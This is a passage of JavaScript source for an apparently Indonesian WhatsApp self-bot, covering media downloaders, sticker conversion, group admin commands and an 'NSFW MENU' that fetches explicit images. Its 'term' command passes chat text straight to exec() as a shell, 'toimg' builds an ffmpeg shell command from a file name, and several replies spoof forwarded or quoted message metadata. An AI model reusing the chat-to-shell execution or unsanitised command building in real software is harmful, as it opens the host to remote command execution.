		                        const { dl_link, thumb, title, filesizeF, filesize } = res
		                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
		                        .then(async (a) => {
		                        if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
		                        const captions = `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
		                        sendMediaURL(from, thumb, captions)
		                        await sendMediaURL(from, dl_link).catch(() => reply('error'))
		                        })                
		                        })
		                        } catch (err) {
		                        reply(mess.error.api)
		                        }
		                   break  
		        case prefix+ 'video':
		            if (args.length === 0) return reply(`Kirim perintah *${prefix}video* _Judul video yang akan dicari_`)
		            var srch = args.join('')
		            aramas = await yts(srch);
		            aramat = aramas.all 
		            var mulaikah = aramat[0].url                            
		                  try {
		                    ytv(mulaikah)
		                    .then((res) => {
		                        const { dl_link, thumb, title, filesizeF, filesize } = res
		                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
		                        .then(async (a) => {
		                        if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
		                        const captions = `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
		                        sendMediaURL(from, thumb, captions)
		                        await sendMediaURL(from, dl_link).catch(() => reply('error'))
		                        })                
		                        })
		                        } catch (err) {
		                        reply(mess.error.api)
		                        }
		                   break      
		    case prefix+ 'sticker': 
		    case prefix+ 'stiker':
		    case prefix+ 'sg':
		    case prefix+ 's':
		            if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
		            const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            const media = await alpha.downloadAndSaveMediaMessage(encmedia)
		                ran = '666.webp'
		                await ffmpeg(`./${media}`)
		                .input(media)
		                .on('start', function (cmd) {
		                     console.log(`Started : ${cmd}`)
		                })
		                .on('error', function (err) {
		                 console.log(`Error : ${err}`)
		                fs.unlinkSync(media)
		                reply('error')
		                })
		                .on('end', function () {
		                console.log('Finish')
		                alpha.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
		                 fs.unlinkSync(media)
		                fs.unlinkSync(ran)
		                })
		                .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
		                .toFormat('webp')
		                .save(ran)
		                } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
		                const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		                const media = await alpha.downloadAndSaveMediaMessage(encmedia)
		            ran = '999.webp'
		            reply(mess.wait)
		            await ffmpeg(`./${media}`)
		            .inputFormat(media.split('.')[1])
		            .on('start', function (cmd) {
		            console.log(`Started : ${cmd}`)
		            })
		            .on('error', function (err) {
		            console.log(`Error : ${err}`)
		            fs.unlinkSync(media)
		            tipe = media.endsWith('.mp4') ? 'video' : 'gif'
		            reply(`Gagal, pada saat mengkonversi ${tipe} ke stiker`)
		            })
		            .on('end', function () {
		            console.log('Finish')
		            alpha.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
		            fs.unlinkSync(media)
		            fs.unlinkSync(ran)
		                })
		                .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
		                .toFormat('webp')
		                .save(ran)
		            } else {
		                fakegroup(`Kirim gambar dengan caption ${prefix}sticker\nDurasi Sticker Video 1-9 Detik`)
		            }
		            break               
		    case prefix+ 'toimg':
		if (!isQuotedSticker) return reply('Reply stc nya!')
					fakegroup('```PROSES...```')
					encmediaa = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediaa = await alpha.downloadAndSaveMediaMessage(encmediaa)
					ran = getRandom('.png')
					exec(`ffmpeg -i ${mediaa} ${ran}`, (err) => {
					fs.unlinkSync(mediaa)
					if (err) return reply('Yah gagal, coba ulangi ^_^')
					buffer = fs.readFileSync(ran)
					fakethumb(buffer,'```Nih kak, jgn lupa sub YT : ZEEONE OFC```')
					fs.unlinkSync(ran)
					})
					break
			case prefix+ 'ytsearch':
					if (args.length < 1) return reply('Tolong masukan query!')
					var srch = args.join('');
					try {
		        	var aramas = await yts(srch);
		   			} catch {
		        	return await alpha.sendMessage(from, 'Error!', MessageType.text, dload)
		    		}
		    		aramat = aramas.all 
		    		var tbuff = await getBuffer(aramat[0].image)
		    		var ytresult = '';
		    		ytresult += '「 *YOUTUBE SEARCH* 」'
		    		ytresult += '\n________________________\n\n'
		   			aramas.all.map((video) => {
		        	ytresult += '❏ Title: ' + video.title + '\n'
		            ytresult += '❏ Link: ' + video.url + '\n'
		            ytresult += '❏ Durasi: ' + video.timestamp + '\n'
		            ytresult += '❏ Upload: ' + video.ago + '\n________________________\n\n'
		    		});
		    		ytresult += '◩ *SELF-BOT*'
		    		await fakethumb(tbuff,ytresult)
					break
			case prefix+ 'setreply':
			case prefix+ 'setfake':
			        if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
					if (!q) return fakegroup(mess.wrongFormat)
					fake = q
					fakegroup(`Succes Mengganti Conversation Fake : ${q}`)
					break
			case prefix+ 'setprefix':
			        if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
					prefix = q
					fakeitem(`Succes Mengganti Prefix : ${q}`)
					break
			case prefix+ 'set_stc_menu':
			        if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
			        if (args.length < 1) return reply('Tolong masukan Masukkan FileLenght sticker')
					cmd_stc_menu = q
					fakeitem(`Succes Mengganti stc cmd *MENU* : ${q}`)
					break
			case prefix+ 'set_stc_ping':
			        if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
			if (args.length < 1) return reply('Tolong masukan Masukkan FileLenght sticker')
					cmd_stc_ping = q
					fakeitem(`Succes Mengganti stc cmd *PING* : ${q}`)
					break
			case prefix+ 'set_stc_music':
			        if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
			if (args.length < 1) return reply('Tolong masukan Masukkan FileLenght sticker')
					cmd_stc_play_music = q
					fakeitem(`Succes Mengganti stc cmd *PlAY MUSIC* : ${q}`)
					break
			case prefix+ 'set_stc_gclose':
			        if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
			if (args.length < 1) return reply('Tolong masukan Masukkan FileLenght sticker')
					cmd_stc_group_close = q
					fakeitem(`Succes Mengganti stc cmd *GROUP CLOSE* : ${q}`)
					break
			case prefix+ 'set_stc_gopen':
			        if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
			if (args.length < 1) return reply('Tolong masukan Masukkan FileLenght sticker')
					cmd_stc_group_open = q
					fakeitem(`Succes Mengganti stc cmd *GROUP OPEN* : ${q}`)
					break
			case prefix+ 'set_stc_itos':
			        if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
			if (args.length < 1) return reply('Tolong masukan Masukkan FileLenght sticker')
					cmd_stc_image_to_sticker = q
					fakeitem(`Succes Mengganti stc cmd *IMAGE TO. STICKER* : ${q}`)
					break
			case prefix+ 'set_stc_to_image':
			case prefix+ 'set_stc_toimg':
			        if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
			if (args.length < 1) return reply('Tolong masukan Masukkan FileLenght sticker')
					cmd_stc_to_image = q
					fakeitem(`Succes Mengganti stc cmd *STICKER TO IMAGE* : ${q}`)
					break
			case prefix+ 'set_stc_self':
			        if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
			if (args.length < 1) return reply('Tolong masukan Masukkan FileLenght sticker')
					cmd_stc_self = q
					fakeitem(`Succes Mengganti stc cmd *SELF* : ${q}`)
					break
			case prefix+ 'set_stc_public':
			        if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
			if (args.length < 1) return reply('Tolong masukan Masukkan FileLenght sticker')
					cmd_stc_public = q
					fakeitem(`Succes Mengganti stc cmd *PUBLIC* : ${q}`)
					break
			case prefix+ 'setfakeimg':
			        if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
		        	if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
		            boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
					delb = await alpha.downloadMediaMessage(boij)
					fs.readFileSync(`./image/${thumbnail}`, delb)
					fakestatus('Sukses')
		        	} else {
		            fakeitem(`Kirim gambar dengan caption ${prefix}setfakeimg`)
		          	}
					break	
			case prefix+ 'setthumb':
			        if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
			        if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
		          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
					delb = await alpha.downloadMediaMessage(boij)
					fs.readFileSync(`./image/${thumbnail}`, delb)
					fakestatus('Sukses')
		        	} else {
		            fakegroup(`Kirim gambar dengan caption ${prefix}sethumb`)
		          	}
					break	
			case prefix+ 'ytmp4':
					if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp4 [linkYt]*`)
					let isLinks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
					if (!isLinks2) return reply(mess.error.Iv)
						try {
						reply(mess.wait)
						ytv(args[0])
						.then((res) => {
						const { dl_link, thumb, title, filesizeF, filesize } = res
						axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
						.then((a) => {
						if (Number(filesize) >= 40000) return sendMediaURL(from, thumb, `*YTMP 4!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
						const captionsYtmp4 = `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
						sendMediaURL(from, thumb, captionsYtmp4)
						sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
						})		
						})
						} catch (err) {
					    reply(mess.error.api)
						}
						break
			case prefix+'playmp4':{
                if (args.length < 1) return reply(`Kirim perintah *${prefix}playmp4 query*`)
                try {
                    reply(mess.wait)
                    let yut = await yts(q)
                    ytv(yut.videos[0].url)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then((a) => {
                            if (Number(filesize) >= 40000) return sendFileFromUrl(from, thumb, `*Data Berhasil Didapatkan!*

\`\`\`Title : ${title}\`\`\`
\`\`\`Ext : MP4\`\`\`
\`\`\`Filesize : ${filesizeF}\`\`\`
\`\`\`ID : ${yut.videos[0].videoId}\`\`\`
\`\`\`Upload : ${yut.videos[0].ago}\`\`\`
\`\`\`Ditonton : ${yut.videos[0].views}\`\`\`
\`\`\`Duration : ${yut.videos[0].timestamp}\`\`\`
\`\`\`Link : ${a.data}\`\`\`

_Untuk durasi lebih dari batas disajikan dalam bentuk link_`, mek)
                        const captionisu = `*DATA BERHASIL DIDAPATKAN*

\`\`\`Title : ${title}\`\`\`
\`\`\`Ext : MP4\`\`\`
\`\`\`Size : ${filesizeF}\`\`\`
\`\`\`ID : ${yut.videos[0].videoId}\`\`\`
\`\`\`Upload : ${yut.videos[0].ago}\`\`\`
\`\`\`Ditonton : ${yut.videos[0].views}\`\`\`
\`\`\`Duration : ${yut.videos[0].timestamp}\`\`\`
\`\`\`URL : ${yut.videos[0].url}\`\`\`

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                            sendFileFromUrl(from, thumb, captionisu, mek)
                            sendFileFromUrl(from, dl_link, '', mek)
                           })
                    })
                    .catch((err) => reply(`${err}`))
                } catch (err) {
                   console.log(color('Emror', 'red'), err)
                    reply(mess.error.api)
                }
            }
                break
			case prefix+ 'emoji':
					if (!q) return fakegroup('emojinya?')
					qes = args.join(' ')
					emoji.get(`${qes}`).then(emoji => {
					teks = `${emoji.images[4].url}`
		    		sendStickerFromUrl(from,`${teks}`)	
		    		console.log(teks)
		   			})
		    		break
			case prefix+ 'ytmp3':
					if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp3 [linkYt]*`)
					let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
					if (!isLinks) return reply(mess.error.Iv)
						try {
						reply(mess.wait)
						yta(args[0])
						.then((res) => {
						const { dl_link, thumb, title, filesizeF, filesize } = res
						axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
						.then((a) => {
					    if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
						const captions = `*YTMP3*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
						sendMediaURL(from, thumb, captions)
						sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
						})
						})
						} catch (err) {
						reply(mess.error.api)
						}
						break
		    case prefix+ 'image':
		            if (args.length < 1) return fakegroup('Masukan teks!')
		            const gimg = args.join('');
		            reply(mess.wait)
		            gis(gimg, async (error, result) => {
		            n = result
		            images = n[Math.floor(Math.random() * n.length)].url
		            alpha.sendMessage(from,{url:images},image,{quoted:mek})
		            });
		            break
		    case prefix+ 'tiktokaudio':
		case prefix+ 'tiktok':
		 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
		 		if (!q) return fakegroup('Linknya?')
		ini_url = args[0]
		 		reply(mess.wait)
		            ini_urlnya = `https://hardianto-chan.herokuapp.com/api/download/tiktok?url=${ini_url}&apikey=hardianto`
                    get_result = await fetchJson(ini_urlnya)
                    ini_txt = `*DATA BERHASIL DI TEMUKAN*\n\nAuthor : ${get_result.author}\n`
                    ini_txt += `Caption : ${get_result.caption}\n`
                    ini_txt += `Views : ${get_result.views}`
                    ini_img = await getBuffer(get_result.thumbnail)
                    await alpha.sendMessage(from, ini_img , image, { quoted: mek, caption: ini_txt })
                    ini_buffer = await getBuffer(get_result.audio)
                    alpha.sendMessage(from, ini_buffer, audio, {mimetype: 'audio/mp4', filename: `${get_result.caption}.mp3`, quoted: mek })
            		break
		    case prefix+ 'brainly':
					if (args.length < 1) return reply('Pertanyaan apa')
		          	brien = args.join(' ')
					brainly(`${brien}`).then(res => {
					teks = '❉───────────────────────❉\n'
					for (let Y of res.data) {
					teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`
					}
					alpha.sendMessage(from, teks, text,{quoted:mek,detectLinks: false})                        
		            })              
					break
		    case prefix+ 'ig':
		        if (!isUrl(args[0]) && !args[0].includes('instagram.com')) return reply(mess.Iv)
		        if (!q) return fakegroup('Linknya?')
		        reply(mess.wait)
			igdl(args[0])
			.then((result) => {
		    for (Y of result.url_list )
		    sendMediaURL(from,Y,'Nih')
			})
			break
	case prefix+'pinterest':   
              if (!q) return reply('apa yang mau di cari?')   
              ini_query = args.join('');
				    alpha.updatePresence(from, Presence.composing) 
				reply(mess.wait)
				    data = await fetchJson(`https://fdz-app.herokuapp.com/api/pinterest?q=${ini_query}`)
				    n = JSON.parse(JSON.stringify(data));
				    nimek =  n[Math.floor(Math.random() * n.length)];
				    pok = await getBuffer(nimek)
				    alpha.sendMessage(from, pok, image, { quoted: mek})
				    break
		    case prefix+ 'igstalk':
		            if (!q) return fakegroup('Usernamenya?')
		            ig.fetchUser(`${args.join(' ')}`).then(Y => {
		            console.log(`${args.join(' ')}`)
		            ten = `${Y.profile_pic_url_hd}`
		            teks = `*ID* : ${Y.profile_id}\n*Username* : ${args.join('')}\n*Full Name* : ${Y.full_name}\n*Bio* : ${Y.biography}\n*Followers* : ${Y.following}\n*Following* : ${Y.followers}\n*Private* : ${Y.is_private}\n*Verified* : ${Y.is_verified}\n\n*Link* : https://instagram.com/${args.join('')}`
		            sendMediaURL(from,ten,teks) 
		            })      
		            break    
		    case prefix+ 'fb':
		            if (!q) return reply('Linknya?')
		            if (!isUrl(args[0]) && !args[0].includes('facebook.com')) return reply(mess.Iv)
		            te = args.join(' ')
		            fakestatus(mess.wait)
		            Fb.getInfo(`${te}`)
		            .then(G => {
		            ten = `${G.download.sd}`
		            tek = `${G.title}`
		            sendMediaURL(from,ten,`*Title* : ${tek}\n\n*Link* : ${ten}`)
		            })
		            break    
			case prefix+ 'term':
			        if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
					if (!q) return fakegroup(mess.wrongFormat)
					exec(q, (err, stdout) => {
					if (err) return fakegroup(`SELF-BOT:~ ${err}`)
					if (stdout) {
					fakegroup(stdout)
					}
					})
				    break 
		    case prefix+ 'join':
		            if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
		            try {
		            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(mess.Iv)
		            hen = args[0]
		            if (!q) return fakestatus('Masukan link group')
		            var codeInvite = hen.split('https://chat.whatsapp.com/')[1]
		            if (!codeInvite) return fakegroup ('pastikan link sudah benar!')
		            var response = await alpha.acceptInvite(codeInvite)
		            fakestatus('```SUKSES JOIN GRUP```')
		            } catch {
		            fakegroup('```LINK ERROR!```')
		            }
		            break
		    case prefix+'twitter':
		            if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return reply(mess.Iv)
		            if (!q) return fakegroup('Linknya?')
		            ten = args[0]
		            var res = await twitterGetUrl(`${ten}`)
		            .then(g => {
		            ren = `${g.download[2].url}`
		            sendMediaURL(from,ren,'DONE')
		            })
		            break
		    case prefix+ 'runtime':
		    case prefix+ 'test':
		            run = process.uptime() 
		            teks = `${kyun(run)}`
		            fakegroup(teks)
		            break  
			case prefix+ 'speed':
			case prefix+ 'ping':
					const timestamp = speed();
					const latensi = speed() - timestamp
					exec(`neofetch --stdout`, (error, stdout, stderr) => {
					const child = stdout.toString('utf-8')
					const teks = child.replace(/Memory:/, "Ram:")
					const pingnya = `*${teks}Speed: ${latensi.toFixed(4)} Second*`
					fakegroup(pingnya)
					})
					break
               
		    case prefix+ 'totag':
		            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
		            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, sticker, options)
		            fs.unlinkSync(file)
		            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
		            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, image, options)
		            fs.unlinkSync(file)
		        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
		            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                mimetype : 'audio/mp4',
		                ptt : true,
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, audio, options)
		            fs.unlinkSync(file)
		        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
		            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                mimetype : 'video/mp4',
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, video, options)
		            fs.unlinkSync(file)
		        } else{
		          fakegroup(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
		        }
		        break
		    case prefix+ 'tomp4':
		            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
		            ger = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            owgi = await alpha.downloadAndSaveMediaMessage(ger)
		            webp2mp4File(owgi).then(res=>{
		            sendMediaURL(from,res.result,'Done')
		            })
		            }else {
		            fakegroup('reply stiker')
		            }
		            fs.unlinkSync(owgi)
		            break
		    case prefix+ 'tourl':
		            if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
		            boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
		            owgi = await alpha.downloadMediaMessage(boij)
		            res = await upload(owgi)
		            reply(res)
		            } else {
		            fakegroup('kirim/reply gambar/video')
		            }
		            break
/*
]=====> NSFW MENU<=====[
*/

			case prefix+ 'awoo':
					fakeitem('```BENTAR```')
					anu = await fetchJson(`https://waifu.pics/api/sfw/awoo`)
					buffer = await getBuffer(anu.url)
					anu  = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': msgId, 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": fake , 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}}
                    alpha.sendMessage(from, buffer, image, anu)
					break
			case prefix+ 'blowjob':
					fakeitem('```BENTAR```')
					anu = await fetchJson(`https://nekos.life/api/v2/img/blowjob`)
					buffer = await getBuffer(anu.url)
					anu  = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': msgId, 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": fake , 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}}
                    alpha.sendMessage(from, buffer, image, anu)
					break
			case prefix+ 'hentai': 
					fakeitem('```BENTAR```')
					anu = await fetchJson(`https://waifu.pics/api/nsfw/neko`)
					buffer = await getBuffer(anu.url)
					anu  = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': msgId, 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": fake , 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}}
                    alpha.sendMessage(from, buffer, image, anu)
					break
			case prefix+ 'megumin':
					fakeitem('```BENTAR```')
					anu = await fetchJson(`https://waifu.pics/api/sfw/megumin`)
					buffer = await getBuffer(anu.url)
					anu  = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': msgId, 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": fake , 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}}
                    alpha.sendMessage(from, buffer, image, anu)
					break
			case prefix+ 'neko':
					fakeitem('```BENTAR```')
					anu = await fetchJson(`https://waifu.pics/api/nsfw/neko`)
					buffer = await getBuffer(anu.url)
					anu  = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': msgId, 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": fake , 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}}
                    alpha.sendMessage(from, buffer, image, anu)
					break
			case prefix+ 'trapnime':
					fakeitem('```BENTAR```')
					anu = await fetchJson(`https://waifu.pics/api/nsfw/trap`)
					buffer = await getBuffer(anu.url)
					anu  = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': msgId, 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": fake , 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}}
                    alpha.sendMessage(from, buffer, image, anu)
					break

/*
]=====> GROUP MENU<=====[
*/
  
			case prefix+'add':
                if (!isGroup) return reply('```Only group```')
                if (!isGroupAdmins)return reply('```Gunakan akun lain untuk melakukan perintah ini```')
                if (!isBotGroupAdmins) return reply('```Jadikan bot sebagai admin```')
                
                if (mentioned){
                    alpha.groupAdd(from, mentioned)
                    .then((res) => reply(jsonformat(res)))
                    .catch((err) => reply(jsonformat(err)))
                } else if (isQuotedMek) {
                    if (quotedMek.sender === owner) return reply(`Tidak bisa kick Owner`)
                    alpha.groupAdd(from, [quotedMek.sender])
                    .then((res) => reply(jsonformat(res)))
                    .catch((err) => reply(jsonformat(err)))
                } else if (!isNaN(args[1])) {
                    alpha.groupAdd(from, [args[1] + '@s.whatsapp.net'])
                    .then((res) => reply(jsonformat(res)))
                    .catch((err) => reply(jsonformat(err)))
                } else {
                    reply(`Kirim perintah ${prefix}kick @tag atau nomor atau reply pesan orang yang ingin di kick`)
                }
                break
			case prefix+'kick':
                if (!isGroup) return reply('```Only group```')
                if (!isGroupAdmins)return reply('```Only grup admins```')
                if (!isBotGroupAdmins) return reply('```Jadikan bot sebagai admin```')
                
                if (mentioned){
                    alpha.groupRemove(from, mentioned)
                    .then((res) => reply(jsonformat(res)))
                    .catch((err) => reply(jsonformat(err)))
                } else if (isQuotedMek) {
                    if (quotedMek.sender === owner) return reply(`Tidak bisa kick Owner`)
                    alpha.groupRemove(from, [quotedMek.sender])
                    .then((res) => reply(jsonformat(res)))
                    .catch((err) => reply(jsonformat(err)))
                } else if (!isNaN(args[1])) {
                    alpha.groupRemove(from, [args[1] + '@s.whatsapp.net'])
                    .then((res) => reply(jsonformat(res)))
                    .catch((err) => reply(jsonformat(err)))
                } else {
                    reply(`Kirim perintah ${prefix}kick @tag atau nomor atau reply pesan orang yang ingin di kick`)
                }
                break
			case 'admin':
					if (!isGroup) return fakestatus('```KHUSUS GRUP BRO```')
					teks = `*DAFTAR ATASAN GROUP* _${groupMetadata.subject}_\n*TOTAL* : ${groupAdmins.length}\n\n`
					no = 0
					for (let admon of groupAdmins) {
					no += 1
					teks += `[${no.toString()}] @${admon.split('@')[0]}\n`
					}
					mentions(teks, groupAdmins, true)
					break
			
			case 'tagall':
			        if (!isGroup) return fakestatus('```KHUSUS GRUP BRO```')
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += '\n\n'
					for (let mem of groupMembers) {
					teks += `@${mem.jid.split('@')[0]}\n`
					members_id.push(mem.jid)
					}
					mentions(teks, members_id, true)
					break

			case 'clearall':
